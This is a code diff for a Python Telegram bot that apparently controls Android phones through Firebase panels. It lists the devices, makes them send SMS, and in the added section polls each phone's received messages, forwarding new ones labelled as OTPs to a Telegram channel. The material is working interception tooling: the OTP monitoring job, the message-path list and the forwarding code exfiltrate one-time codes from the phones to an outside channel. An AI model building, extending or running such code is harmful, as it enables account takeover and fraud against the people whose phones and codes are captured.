@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-print("Starting bot...")
+print("Starting bot (with OTP SMS Forwarding)...")
 
 import asyncio
 import json
@@ -15,7 +15,7 @@ import time
 import sqlite3
 import urllib.parse
 from datetime import datetime
-from typing import Dict, List, Set, Optional, Tuple
+from typing import Dict, List, Set, Optional, Tuple, Any
 
 try:
     import google.auth.transport.requests
@@ -36,16 +36,12 @@ from telegram.ext import (
 )
 
 # ===================== CONFIG =====================
-# Single source: panel settings.json (fuckwebpanel keys) + env overrides
-# telegramAutoBotToken → bot that runs this process
-# telegramBotToken → optional alternate token source
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 SETTINGS_FILE = os.path.join(BASE_DIR, "settings.json")
 DB_FILE = os.path.join(BASE_DIR, "bot_data.db")
 OLD_CONFIG_FILE = os.path.join(BASE_DIR, "config.json")
 RELOAD_FLAG = os.path.join(BASE_DIR, ".reload_flag")
 
-# Mutated at runtime by reload_runtime_config()
 BOT_TOKEN = ""
 CHANNEL_USERNAME = ""
 CHANNEL_TITLE = ""
@@ -78,7 +74,6 @@ def _first_str(*vals) -> str:
 
 
 def reload_runtime_config() -> dict:
-    """Load panel settings into module globals. Safe to call anytime."""
     global BOT_TOKEN, CHANNEL_USERNAME, CHANNEL_TITLE, CHANNEL_LINK
     global SMS_FORWARDER_NUMBER
     global ADMIN_IDS, _settings_mtime
@@ -89,7 +84,6 @@ def reload_runtime_config() -> dict:
     except Exception:
         _settings_mtime = 0.0
 
-    # Bot token priority: env BOT_TOKEN → telegramAutoBotToken → telegramBotToken → legacy bot_token
     BOT_TOKEN = _first_str(
         os.environ.get("BOT_TOKEN"),
         os.environ.get("TELEGRAM_AUTO_BOT_TOKEN"),
@@ -98,7 +92,6 @@ def reload_runtime_config() -> dict:
         cfg.get("bot_token"),
     )
 
-    # Optional force-join (empty = off)
     CHANNEL_USERNAME = _first_str(
         os.environ.get("CHANNEL_USERNAME"),
         cfg.get("channel_username"),
@@ -128,7 +121,6 @@ def reload_runtime_config() -> dict:
     }
 
 
-# Initial load
 reload_runtime_config()
 
 DEFAULT_USER_CONFIG = {
@@ -139,15 +131,25 @@ DEFAULT_USER_CONFIG = {
     "monitored_groups": [],
     "confirm_reply": False,
     "parsing_enabled": True,
+    # ===== NEW OTP / SMS Forwarding fields =====
+    "otp_channel_id": None,          # int or str channel id
+    "otp_channel_title": "",
+    "otp_locked_messages": {},       # path -> list of locked keys
+    "otp_last_seen": {},             # path -> list of last seen keys (runtime)
 }
 
-MAIN_MENU, ADD_FIREBASE, ADD_PUBLIC_FIREBASE, ADD_PRIVATE_FIREBASE, ADD_FIREBASE_SECRET, ADD_GROUP, AWAITING_SIM, AWAITING_DEVICE = range(8)
+MAIN_MENU, ADD_FIREBASE, ADD_PUBLIC_FIREBASE, ADD_PRIVATE_FIREBASE, ADD_FIREBASE_SECRET, ADD_GROUP, AWAITING_SIM, AWAITING_DEVICE, AWAITING_OTP_CHANNEL = range(9)
 
 # ===================== CACHE =====================
 user_cache: Dict[str, dict] = {}
 group_index: Dict[str, Set[str]] = {}
 banned_set: Set[str] = set()
 cache_lock = threading.RLock()
+
+# Runtime-only (not persisted): currently monitoring users
+# uid_str -> {"device_id": ..., "paths": [...], "last_seen": {...}}
+otp_runtime: Dict[str, dict] = {}
+otp_runtime_lock = threading.RLock()
 
 # ===================== LOGGING =====================
 logging.basicConfig(
@@ -176,7 +178,6 @@ def init_db():
                 banned_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         """)
-        # WAL mode: allows concurrent reads during writes (prevents DB lock errors)
         cur.execute("PRAGMA journal_mode=WAL")
         conn.commit()
     except Exception as e:
@@ -204,6 +205,10 @@ def migrate_from_json():
                 else:
                     groups.append(g)
             cfg["monitored_groups"] = groups
+            # ensure new keys exist
+            for k, v in DEFAULT_USER_CONFIG.items():
+                if k not in cfg:
+                    cfg[k] = copy.deepcopy(v)
             cur.execute(
                 "INSERT OR REPLACE INTO users (user_id, config, updated_at) VALUES (?, ?, CURRENT_TIMESTAMP)",
                 (str(uid), json.dumps(cfg, ensure_ascii=False))
@@ -231,11 +236,9 @@ def load_cache():
             for uid, conf in cur.fetchall():
                 try:
                     cfg = json.loads(conf)
-                    # Ensure all default keys exist (in case old DB rows are missing keys)
                     for k, v in DEFAULT_USER_CONFIG.items():
                         if k not in cfg:
                             cfg[k] = copy.deepcopy(v)
-                    # Normalize firebase_list entries
                     firebase_list = []
                     for fb in cfg.get("firebase_list", []):
                         if isinstance(fb, str):
@@ -277,13 +280,9 @@ def get_user_config(user_id: int) -> dict:
     uid = str(user_id)
     with cache_lock:
         if uid in user_cache:
-            # Return a deep copy so callers can't accidentally mutate the cache
-            # without calling save_user_config()
             return copy.deepcopy(user_cache[uid])
-        # New user — create default config
         cfg = copy.deepcopy(DEFAULT_USER_CONFIG)
         user_cache[uid] = copy.deepcopy(cfg)
-    # Save to DB outside lock to avoid deadlock
     _save_to_db(uid, cfg)
     logger.info(f"🆕 New user registered: {uid}")
     return cfg
@@ -297,10 +296,8 @@ def save_user_config(user_id: int, cfg: dict):
         for g in cfg.get("monitored_groups", []):
             g["id"] = str(g["id"])
 
-        # Store a deep copy so external mutations don't affect the cache
         user_cache[uid] = copy.deepcopy(cfg)
 
-        # Rebuild group_index for this user
         for gid in old_ids - new_ids:
             if gid in group_index:
                 group_index[gid].discard(uid)
@@ -310,7 +307,7 @@ def save_user_config(user_id: int, cfg: dict):
         for gid in new_ids - old_ids:
             group_index.setdefault(gid, set()).add(uid)
 
-        logger.info(f"💾 Saved config for {uid} | groups={list(new_ids)} | device={cfg.get('device_id')} | parsing={cfg.get('parsing_enabled')}")
+        logger.info(f"💾 Saved config for {uid} | device={cfg.get('device_id')} | otp={cfg.get('otp_channel_id')}")
 
     _save_to_db(uid, cfg)
 
@@ -371,6 +368,8 @@ def delete_user_data(user_id: int):
                     group_index[gid].discard(uid)
                     if not group_index[gid]:
                         del group_index[gid]
+    with otp_runtime_lock:
+        otp_runtime.pop(uid, None)
     try:
         conn = sqlite3.connect(DB_FILE)
         cur = conn.cursor()
@@ -407,7 +406,6 @@ def remove_group_from_all_users(group_id: str):
             user_cache[uid] = cfg
             to_save.append((uid, copy.deepcopy(cfg)))
         group_index.pop(group_id, None)
-    # Save to DB outside lock to prevent deadlock
     for uid, cfg in to_save:
         _save_to_db(uid, cfg)
     logger.info(f"🧹 Removed dead group {group_id} from {len(user_ids)} users")
@@ -429,7 +427,6 @@ def update_group_title(group_id: str, new_title: str):
             if changed:
                 user_cache[uid] = cfg
                 to_save.append((uid, copy.deepcopy(cfg)))
-    # Save to DB outside lock to prevent deadlock
     for uid, cfg in to_save:
         _save_to_db(uid, cfg)
     if to_save:
@@ -441,7 +438,7 @@ FIREBASE_SCOPES = [
     "https://www.googleapis.com/auth/firebase.database"
 ]
 
-_token_cache: Dict[str, Tuple[str, float]] = {}  # client_email -> (token, expiry_ts)
+_token_cache: Dict[str, Tuple[str, float]] = {}
 
 def get_service_account_token(sa_info: dict) -> Optional[str]:
     if not HAS_GOOGLE_AUTH or not isinstance(sa_info, dict):
@@ -469,9 +466,6 @@ def get_service_account_token(sa_info: dict) -> Optional[str]:
     return None
 
 async def extract_json_from_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Tuple[Optional[dict], Optional[str]]:
-    """
-    Extracts and parses JSON from uploaded .json document or raw JSON text.
-    """
     msg = update.message
     if not msg:
         return None, None
@@ -500,14 +494,9 @@ async def extract_json_from_message(update: Update, context: ContextTypes.DEFAUL
     return None, None
 
 def parse_service_account_dict(data: dict) -> Tuple[bool, Optional[str], Optional[str], Optional[str]]:
-    """
-    Validates if dict is Firebase Service Account JSON or google-services.json.
-    Returns (is_valid, project_id, default_url, error_message)
-    """
     if not isinstance(data, dict):
         return False, None, None, "Invalid JSON data."
 
-    # Detect google-services.json (Android app config)
     if "project_info" in data and "client" in data:
         proj_info = data.get("project_info", {})
         fb_url = proj_info.get("firebase_url") or f"https://{proj_info.get('project_id', '')}-default-rtdb.firebaseio.com"
@@ -520,7 +509,6 @@ def parse_service_account_dict(data: dict) -> Tuple[bool, Optional[str], Optiona
             "4. Jo `.json` file download hogi, wo yahan upload karein!"
         )
 
-    # Check for Firebase Service Account Key
     if data.get("type") == "service_account" and data.get("private_key"):
         project_id = data.get("project_id")
         if not project_id:
@@ -531,7 +519,6 @@ def parse_service_account_dict(data: dict) -> Tuple[bool, Optional[str], Optiona
     return False, None, None, "Ye valid Firebase Service Account JSON key nahi hai."
 
 def normalize_firebase_base(url: str) -> str:
-    """Clean RTDB root URL (strip ?query, trailing /.json, accidental /clients etc)."""
     url = (url or "").strip()
     if not url:
         return ""
@@ -542,14 +529,7 @@ def normalize_firebase_base(url: str) -> str:
         path = (parsed.path or "").rstrip("/")
         if path.endswith(".json"):
             path = path[:-5].rstrip("/")
-        # users sometimes paste full node paths
-        for leaf in (
-            "/clients",
-            "/devices",
-            "/messages",
-            "/deviceMessages",
-            "/.json",
-        ):
+        for leaf in ("/clients", "/devices", "/messages", "/deviceMessages", "/.json"):
             if path.endswith(leaf):
                 path = path[: -len(leaf)].rstrip("/")
         return f"{parsed.scheme}://{parsed.netloc}{path}".rstrip("/")
@@ -558,9 +538,6 @@ def normalize_firebase_base(url: str) -> str:
 
 
 def parse_firebase_input(text: str) -> Tuple[str, str]:
-    """
-    Extract base URL and secret if input has ?auth= / ?access_token= query param.
-    """
     text = (text or "").strip()
     try:
         parsed = urllib.parse.urlparse(text)
@@ -579,21 +556,17 @@ def parse_firebase_input(text: str) -> Tuple[str, str]:
 
 
 def clean_database_secret(raw: str) -> str:
-    """Normalize pasted Database Secret (quotes / whitespace / accidental labels)."""
     s = (raw or "").strip()
     if not s:
         return ""
-    # strip wrapping quotes
     if (s.startswith('"') and s.endswith('"')) or (s.startswith("'") and s.endswith("'")):
         s = s[1:-1].strip()
-    # user sometimes pastes "auth=XXXX" or full URL with secret
     if s.lower().startswith("auth="):
         s = s.split("=", 1)[1].strip()
     if s.startswith("http://") or s.startswith("https://"):
         _, sec = parse_firebase_input(s)
         if sec:
             return sec
-    # multi-line paste → first non-empty line
     if "\n" in s:
         for line in s.splitlines():
             line = line.strip()
@@ -607,7 +580,6 @@ def validate_firebase_url(url: str) -> bool:
     u = (url or "").strip()
     if not u.startswith(("https://", "http://")):
         return False
-    # must look like firebase RTDB host (loose check)
     host = ""
     try:
         host = (urllib.parse.urlparse(u).netloc or "").lower()
@@ -623,10 +595,6 @@ def test_firebase_auth(
     secret: str = "",
     service_account: Optional[dict] = None,
 ) -> Tuple[bool, str]:
-    """
-    Live RTDB auth check before saving private Firebase.
-    Returns (ok, human_message).
-    """
     base = normalize_firebase_base(base_url)
     if not base:
         return False, "Invalid Firebase URL"
@@ -736,11 +704,6 @@ def get_active_firebase_secret(user_cfg: dict) -> str:
     return get_active_firebase_entry(user_cfg).get("secret", "")
 
 def get_firebase_request_params(user_cfg: dict, path: str) -> Tuple[str, dict]:
-    """
-    Returns (full_url, headers).
-    - Service Account → ?access_token= + Bearer
-    - Database Secret → ?auth= (URL-encoded)
-    """
     entry = get_active_firebase_entry(user_cfg)
     base = normalize_firebase_base(entry.get("url", "") or "")
     if not base:
@@ -773,37 +736,26 @@ def build_firebase_url(user_cfg: dict, path: str) -> str:
     return url
 
 def _to_ms_ts(val) -> Optional[float]:
-    """Normalize seconds/ms timestamps to milliseconds."""
     try:
         fv = float(val)
     except Exception:
         return None
-    # seconds since epoch (~1e9–1e10) → ms
     if fv < 1e12:
         fv *= 1000.0
     return fv
 
 
 def is_device_online(data: dict, now_ms: float = None) -> bool:
-    """
-    Broad online detection across different APK/Firebase schemas:
-    - isOnline / online / connected booleans
-    - status: True | 1 | "online" | "active" | "alive" | "on"
-    - lastOnlineAt / last_seen / lastSeen (within 15 min)
-    - heartbeat.timestamp or heartbeat dict with status alive (within 15 min)
-    """
     if not isinstance(data, dict):
         return False
     if now_ms is None:
         now_ms = time.time() * 1000
 
-    # truthy checks (working.py style) — not only `is True`
     if data.get("isOnline") or data.get("online") or data.get("connected"):
         return True
 
     st = data.get("status")
     if st is True or st == 1 or st is False:
-        # explicit False/True
         return st is True or st == 1
     if isinstance(st, str) and st.strip().lower() in (
         "online", "active", "alive", "on", "true", "1", "connected"
@@ -812,7 +764,6 @@ def is_device_online(data: dict, now_ms: float = None) -> bool:
     if isinstance(st, (int, float)) and st != 0:
         return True
 
-    # timestamp-based freshness (15 minutes)
     window = 900_000.0
     for key in (
         "lastOnlineAt", "last_seen", "lastSeen", "lastSeenAt",
@@ -840,7 +791,6 @@ def is_device_online(data: dict, now_ms: float = None) -> bool:
 
 
 def device_display_meta(data: dict) -> Tuple[str, str, bool]:
-    """Return (model_label, phone_label, is_online) for UI."""
     if not isinstance(data, dict):
         return "", "", False
     model = (
@@ -866,14 +816,7 @@ def device_display_meta(data: dict) -> Tuple[str, str, bool]:
 
 
 def fetch_all_devices(user_cfg: dict) -> Dict[str, dict]:
-    """
-    working.py uses clients.json first (main source for most panels).
-    Also merge devices.json when present (some projects use that path).
-    clients wins on field conflicts.
-    """
     merged: Dict[str, dict] = {}
-
-    # clients FIRST (working.py), then devices
     for path in ("clients.json", "devices.json"):
         url, headers = get_firebase_request_params(user_cfg, path)
         if not url:
@@ -897,7 +840,6 @@ def fetch_all_devices(user_cfg: dict) -> Dict[str, dict]:
                 merged[did_s] = data
             count += 1
         logger.info(f"Firebase {path}: {count} device nodes")
-
     return merged
 
 
@@ -915,13 +857,11 @@ def get_online_devices(user_cfg: dict) -> Dict[str, dict]:
 
 
 def get_all_devices(user_cfg: dict) -> Dict[str, dict]:
-    """All devices (online+offline) for selection UI fallback."""
     return fetch_all_devices(user_cfg)
 
 
 def get_device_data(user_cfg: dict, did: str) -> dict:
     did = str(did)
-    # working.py: clients/{id} first
     for path in (f"clients/{did}.json", f"devices/{did}.json"):
         url, headers = get_firebase_request_params(user_cfg, path)
         data = fetch_json(url, headers=headers, timeout=10) if url else {}
@@ -959,10 +899,6 @@ def diagnose_failure(user_cfg: dict) -> str:
     return "Unknown error (check device / SIM)"
 
 def _send_sms_sync(user_cfg: dict, to: str, msg: str) -> Tuple[bool, str]:
-    """
-    working.py path first: clients/{id}/webhookEvent/sendSms.json
-    then devices/* fallbacks (newer APKs).
-    """
     did = user_cfg.get("device_id", "")
     if not did:
         return False, "No device selected"
@@ -984,7 +920,6 @@ def _send_sms_sync(user_cfg: dict, to: str, msg: str) -> Tuple[bool, str]:
         "sendOk": False,
     }
 
-    # Order matches working.py first, then extended paths
     attempts = [
         (f"clients/{did}/webhookEvent/sendSms.json", payload_simple),
         (f"devices/{did}/webhookEvent/sendSms.json", payload_simple),
@@ -1151,16 +1086,247 @@ def extract_sims(device_data: dict) -> List[dict]:
             return sims
     return [{"index": 0, "label": "📶 SIM 1"}, {"index": 1, "label": "📶 SIM 2"}]
 
+# ===================== OTP / SMS FORWARDING SYSTEM =====================
+def _fetch_json_fast(url: str, headers: dict = None, timeout: float = 2.5) -> dict:
+    """Fast single-shot fetch for OTP monitoring (no retries, short timeout)."""
+    try:
+        r = requests.get(url, headers=headers or {}, timeout=timeout)
+        if r.status_code == 200:
+            txt = r.text.strip()
+            return {} if txt == "null" else r.json()
+    except Exception:
+        pass
+    return {}
+
+
+def find_message_paths(device_id: str) -> List[str]:
+    """
+    Possible Firebase paths where incoming SMS are stored (same as first bot).
+    Most common paths first so new messages are detected faster.
+    """
+    did = str(device_id)
+    return [
+        f"messages/{did}.json",                 # most common
+        f"clients/{did}/messages.json",
+        f"devices/{did}/messages.json",
+        f"Messages/{did}.json",
+        f"clients/{did}/Messages.json",
+        f"sms/{did}.json",
+        f"receivedMessages/{did}.json",
+        f"inbox/{did}.json",
+    ]
+
+
+def lock_existing_messages(user_cfg: dict, device_id: str) -> dict:
+    """
+    Read all current messages and return a locked dict {path: [keys...]}.
+    This prevents historical SMS from being forwarded.
+    Uses short timeout so device connect stays responsive.
+    """
+    locked: Dict[str, List[str]] = {}
+    paths = find_message_paths(device_id)
+    for path in paths:
+        url, headers = get_firebase_request_params(user_cfg, path)
+        if not url:
+            continue
+        data = _fetch_json_fast(url, headers=headers, timeout=3.0)
+        if not data:
+            continue
+        if isinstance(data, dict):
+            keys = list(data.keys())
+            locked[path] = keys
+            logger.info(f"🔒 Locked {len(keys)} existing messages at {path}")
+        elif isinstance(data, str):
+            locked[path] = [str(hash(data))]
+    return locked
+
+
+def is_message_locked(locked: dict, path: str, key: str) -> bool:
+    return key in (locked.get(path) or [])
+
+
+def extract_sms_fields(msg_val: Any) -> Tuple[str, str, str]:
+    """Return (from, body, time) from a message node."""
+    if isinstance(msg_val, str):
+        return "Unknown", msg_val, datetime.now().strftime("%H:%M:%S")
+    if not isinstance(msg_val, dict):
+        return "Unknown", "No message", datetime.now().strftime("%H:%M:%S")
+
+    sms_from = (
+        msg_val.get("from")
+        or msg_val.get("sender")
+        or msg_val.get("phoneNumber")
+        or msg_val.get("number")
+        or msg_val.get("address")
+        or "Unknown"
+    )
+    sms_body = (
+        msg_val.get("body")
+        or msg_val.get("message")
+        or msg_val.get("text")
+        or msg_val.get("sms")
+        or "No message"
+    )
+    sms_time = (
+        msg_val.get("time")
+        or msg_val.get("timestamp")
+        or msg_val.get("date")
+        or msg_val.get("receivedTime")
+        or datetime.now().strftime("%H:%M:%S")
+    )
+    if isinstance(sms_time, (int, float)):
+        try:
+            if sms_time > 1e12:
+                sms_time = datetime.fromtimestamp(sms_time / 1000).strftime("%H:%M:%S")
+            else:
+                sms_time = datetime.fromtimestamp(sms_time).strftime("%H:%M:%S")
+        except Exception:
+            sms_time = str(sms_time)
+    return str(sms_from), str(sms_body), str(sms_time)
+
+
+def format_otp_message(sms_from: str, sms_body: str, sms_time: str) -> str:
+    return (
+        "╔════════════════════════╗\n"
+        "      📱 𝗡𝗘𝗪 𝗦𝗠𝗦 𝗥𝗘𝗖𝗘𝗜𝗩𝗘𝗗\n"
+        "╚════════════════════════╝\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📞 𝗙𝗿𝗼𝗺: {sms_from}\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"📝 𝗠𝗲𝘀𝘀𝗮𝗴𝗲:\n{sms_body}\n\n"
+        f"🕐 𝗧𝗶𝗺𝗲: {sms_time}\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "📋 Tap on the code to copy it"
+    )
+
+
+def start_otp_monitoring(user_id: int, user_cfg: dict):
+    """Call this after device is selected AND otp_channel is set."""
+    uid = str(user_id)
+    device_id = user_cfg.get("device_id")
+    otp_ch = user_cfg.get("otp_channel_id")
+    if not device_id or not otp_ch:
+        return
+
+    # Lock existing messages
+    locked = lock_existing_messages(user_cfg, device_id)
+    user_cfg["otp_locked_messages"] = locked
+    user_cfg["otp_last_seen"] = {p: list(keys) for p, keys in locked.items()}
+    save_user_config(user_id, user_cfg)
+
+    with otp_runtime_lock:
+        otp_runtime[uid] = {
+            "device_id": device_id,
+            "paths": find_message_paths(device_id),
+            "last_seen": {p: set(keys) for p, keys in locked.items()},
+            "locked": {p: set(keys) for p, keys in locked.items()},
+        }
+    logger.info(f"✅ OTP monitoring started for user {uid} device {device_id[:16]}...")
+
+
+def stop_otp_monitoring(user_id: int):
+    uid = str(user_id)
+    with otp_runtime_lock:
+        otp_runtime.pop(uid, None)
+    logger.info(f"🛑 OTP monitoring stopped for user {uid}")
+
+
+async def otp_monitor_job(context: ContextTypes.DEFAULT_TYPE):
+    """
+    High-frequency background job: poll Firebase for new SMS and forward to OTP channels.
+    Interval is ~0.7s so delay is minimal (same spirit as the first bot's 0.5s loop).
+    """
+    bot = context.bot
+    with otp_runtime_lock:
+        active = list(otp_runtime.items())
+
+    if not active:
+        return
+
+    loop = asyncio.get_running_loop()
+
+    for uid_str, info in active:
+        try:
+            with cache_lock:
+                cfg = copy.deepcopy(user_cache.get(uid_str))
+            if not cfg:
+                continue
+            if not cfg.get("otp_channel_id") or not cfg.get("device_id"):
+                continue
+            if cfg.get("device_id") != info.get("device_id"):
+                # device changed → restart lock
+                start_otp_monitoring(int(uid_str), cfg)
+                continue
+
+            otp_channel_id = cfg["otp_channel_id"]
+            last_seen = info.get("last_seen", {})
+            locked = info.get("locked", {})
+            new_found = False
+
+            for path in info.get("paths", []):
+                url, headers = get_firebase_request_params(cfg, path)
+                if not url:
+                    continue
+                # Fast fetch in thread pool so we don't block the event loop
+                data = await loop.run_in_executor(
+                    None, lambda u=url, h=headers: _fetch_json_fast(u, h, 2.2)
+                )
+                if not data:
+                    continue
+
+                if isinstance(data, dict):
+                    for msg_key, msg_val in data.items():
+                        key_str = str(msg_key)
+                        if key_str in locked.get(path, set()) or key_str in last_seen.get(path, set()):
+                            continue
+                        # New message — forward immediately
+                        last_seen.setdefault(path, set()).add(key_str)
+                        locked.setdefault(path, set()).add(key_str)
+                        new_found = True
+                        sms_from, sms_body, sms_time = extract_sms_fields(msg_val)
+                        if sms_from == "Unknown" and sms_body == "No message":
+                            continue
+                        text = format_otp_message(sms_from, sms_body, sms_time)
+                        try:
+                            await bot.send_message(chat_id=otp_channel_id, text=text)
+                            logger.info(f"✅ OTP forwarded to {otp_channel_id} for user {uid_str}")
+                        except Exception as e:
+                            logger.error(f"Failed to forward OTP: {e}")
+                elif isinstance(data, str):
+                    h = str(hash(data))
+                    if h in locked.get(path, set()) or h in last_seen.get(path, set()):
+                        continue
+                    last_seen.setdefault(path, set()).add(h)
+                    locked.setdefault(path, set()).add(h)
+                    new_found = True
+                    text = format_otp_message("Unknown", data, datetime.now().strftime("%H:%M:%S"))
+                    try:
+                        await bot.send_message(chat_id=otp_channel_id, text=text)
+                        logger.info(f"✅ OTP (str) forwarded to {otp_channel_id} for user {uid_str}")
+                    except Exception as e:
+                        logger.error(f"Failed to forward OTP (str): {e}")
+
+            if new_found:
+                with otp_runtime_lock:
+                    if uid_str in otp_runtime:
+                        otp_runtime[uid_str]["last_seen"] = last_seen
+                        otp_runtime[uid_str]["locked"] = locked
+
+        except Exception as e:
+            logger.error(f"OTP monitor error for {uid_str}: {e}")
+
+
 # ===================== KEYBOARDS =====================
 def get_main_keyboard(user_cfg: dict):
     reply_label = "🔔 Start Reply" if not user_cfg.get("confirm_reply") else "🔔 Stop Reply"
     parse_label = "▶️ Start Auto Token Sender" if not user_cfg.get("parsing_enabled", True) else "⏸️ Stop Auto Token Sender"
+    otp_label = "📨 OTP Channel"
     return ReplyKeyboardMarkup(
         [
             [KeyboardButton("📊 Status")],
             [KeyboardButton("📁 Manage Firebase")],
             [KeyboardButton("📱 Device"), KeyboardButton("📶 SIM")],
-            [KeyboardButton("👥 Group")],
+            [KeyboardButton("👥 Group"), KeyboardButton(otp_label)],
             [KeyboardButton(reply_label), KeyboardButton(parse_label)]
         ],
         resize_keyboard=True
@@ -1184,7 +1350,6 @@ GROUP_SUB = ReplyKeyboardMarkup(
 
 # ===================== ACCESS =====================
 async def is_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    # No channel configured in settings → skip force-join
     if not CHANNEL_USERNAME:
         return True
     try:
@@ -1241,6 +1406,7 @@ def build_status_text(user_cfg: dict) -> str:
     sim_idx = user_cfg.get("sim_index", 0)
     sim_display = f"SIM {sim_idx + 1}" if dev != "Not set" else "Not set"
     groups = user_cfg.get("monitored_groups", [])
+    otp_ch = user_cfg.get("otp_channel_title") or user_cfg.get("otp_channel_id") or "Not set"
 
     msg = (
         f"📊 **Your Status**\n"
@@ -1254,6 +1420,7 @@ def build_status_text(user_cfg: dict) -> str:
         title = g.get("title") or g["id"]
         msg += f"• `{title}` (`{g['id']}`)\n"
     msg += (
+        f"📨 OTP Channel: `{otp_ch}`\n"
         f"🔔 Reply: {'ON' if user_cfg.get('confirm_reply') else 'OFF'}\n"
         f"🤖 Auto Token Sender: {'ON' if user_cfg.get('parsing_enabled', True) else 'OFF'}"
     )
@@ -1311,6 +1478,7 @@ async def cmd_userinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Banned: `{is_banned(tid)}`\n"
         f"Firebases: `{len(cfg.get('firebase_list', []))}`\n"
         f"Device: `{cfg.get('device_id') or 'None'}`\n"
+        f"OTP Channel: `{cfg.get('otp_channel_id') or 'None'}`\n"
         f"Groups: `{len(cfg.get('monitored_groups', []))}`\n"
         f"Auto Sender: `{'ON' if cfg.get('parsing_enabled', True) else 'OFF'}`"
     )
@@ -1399,18 +1567,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await require_access(update, context):
         return ConversationHandler.END
     user_cfg = get_user_config(update.effective_user.id)
+    # Resume OTP monitoring if already configured
+    if user_cfg.get("device_id") and user_cfg.get("otp_channel_id"):
+        start_otp_monitoring(update.effective_user.id, user_cfg)
     await update.message.reply_text(
-        "🔥 *SMS Gateway Bot*\nYour personal settings.",
+        "🔥 *SMS Gateway Bot*\nYour personal settings.\n\n"
+        "📨 *New:* OTP Channel support – incoming SMS from device will be forwarded automatically.",
         reply_markup=get_main_keyboard(user_cfg),
         parse_mode=ParseMode.MARKDOWN
     )
     return MAIN_MENU
 
 async def prompt_device_selection(update: Update, context: ContextTypes.DEFAULT_TYPE, user_cfg: dict, msg_prefix: str = ""):
-    """
-    List ALL online devices (clients+devices, working.py logic + extras).
-    Pages of 40 (Telegram inline button limit).
-    """
     force_all = bool(context.user_data.get("force_show_all_devices"))
     online = get_online_devices(user_cfg)
     showing_online = True
@@ -1458,7 +1626,6 @@ async def prompt_device_selection(update: Update, context: ContextTypes.DEFAULT_
 
     sorted_devs = sorted(devices.items(), key=sort_key, reverse=True)
 
-    # pagination via context (page size 40 → under Telegram 100-btn limit with extras)
     page = int(context.user_data.get("device_page") or 0)
     page_size = 40
     total = len(sorted_devs)
@@ -1469,7 +1636,6 @@ async def prompt_device_selection(update: Update, context: ContextTypes.DEFAULT_
     start = page * page_size
     chunk = sorted_devs[start:start + page_size]
 
-    # store full list keys for page callbacks (ids only)
     context.user_data["device_list_mode"] = "online" if showing_online else "all"
 
     kb = []
@@ -1486,7 +1652,6 @@ async def prompt_device_selection(update: Update, context: ContextTypes.DEFAULT_
             label = f"{status_icon} {phone} · {short}"
         else:
             label = f"{status_icon} {did}"
-        # Telegram button text max ~64 chars
         if len(label) > 60:
             label = label[:57] + "…"
         kb.append([InlineKeyboardButton(label, callback_data=f"device|{did}")])
@@ -1540,10 +1705,16 @@ async def main_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_cfg = get_user_config(user_id)
     text = (update.message.text or "").strip()
 
-    # Manual device ID entry (after ✏️ button)
+    # Handle OTP channel update from callback
+    if context.user_data.get("awaiting_otp_update"):
+        context.user_data.pop("awaiting_otp_update", None)
+        return await awaiting_otp_channel_handler(update, context)
+
+    # Manual device ID entry
     if context.user_data.get("awaiting_device"):
         menu_buttons = {
             "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
+            "📨 OTP Channel",
             "🔔 Start Reply", "🔔 Stop Reply",
             "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
             "➕ Add Firebase", "🌐 Add Public Firebase", "🔒 Add Private Firebase",
@@ -1559,8 +1730,12 @@ async def main_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if len(sims) == 1:
                 user_cfg["sim_index"] = sims[0]["index"]
                 save_user_config(user_id, user_cfg)
+            # Start OTP monitoring if channel already set
+            if user_cfg.get("otp_channel_id"):
+                start_otp_monitoring(user_id, user_cfg)
             await update.message.reply_text(
-                f"✅ Device <code>{html.escape(text)}</code> saved.",
+                f"✅ Device <code>{html.escape(text)}</code> saved." +
+                ("\n📨 OTP monitoring started." if user_cfg.get("otp_channel_id") else ""),
                 parse_mode=ParseMode.HTML,
                 reply_markup=get_main_keyboard(user_cfg),
             )
@@ -1599,6 +1774,35 @@ async def main_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if text == "👥 Group":
         await update.message.reply_text("Group Management:", reply_markup=GROUP_SUB)
+        return MAIN_MENU
+
+    # ===== NEW: OTP Channel button =====
+    if text == "📨 OTP Channel":
+        if user_cfg.get("otp_channel_id"):
+            title = user_cfg.get("otp_channel_title") or str(user_cfg["otp_channel_id"])
+            kb = InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔄 Update OTP Channel", callback_data="otp_update")],
+                [InlineKeyboardButton("❌ Remove OTP Channel", callback_data="otp_remove")],
+                [InlineKeyboardButton("🔙 Cancel", callback_data="otp_cancel")],
+            ])
+            await update.message.reply_text(
+                f"📨 <b>OTP Channel is set</b>\n\n"
+                f"📢 Channel: <b>{html.escape(str(title))}</b>\n"
+                f"🆔 ID: <code>{user_cfg['otp_channel_id']}</code>\n\n"
+                f"✅ Incoming SMS from your selected device will be forwarded here.",
+                parse_mode=ParseMode.HTML,
+                reply_markup=kb
+            )
+        else:
+            await update.message.reply_text(
+                "📨 <b>OTP Channel Setup</b>\n\n"
+                "Send the channel link / @username / ID where you want incoming SMS to be forwarded.\n\n"
+                "⚠️ <b>Make sure the bot is admin</b> in that channel.\n\n"
+                "<i>(Press any menu button to cancel)</i>",
+                parse_mode=ParseMode.HTML,
+                reply_markup=get_main_keyboard(user_cfg)
+            )
+            return AWAITING_OTP_CHANNEL
         return MAIN_MENU
 
     if text in ("🔔 Start Reply", "🔔 Stop Reply"):
@@ -1715,6 +1919,117 @@ async def main_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Use the buttons below.", reply_markup=get_main_keyboard(user_cfg))
     return MAIN_MENU
 
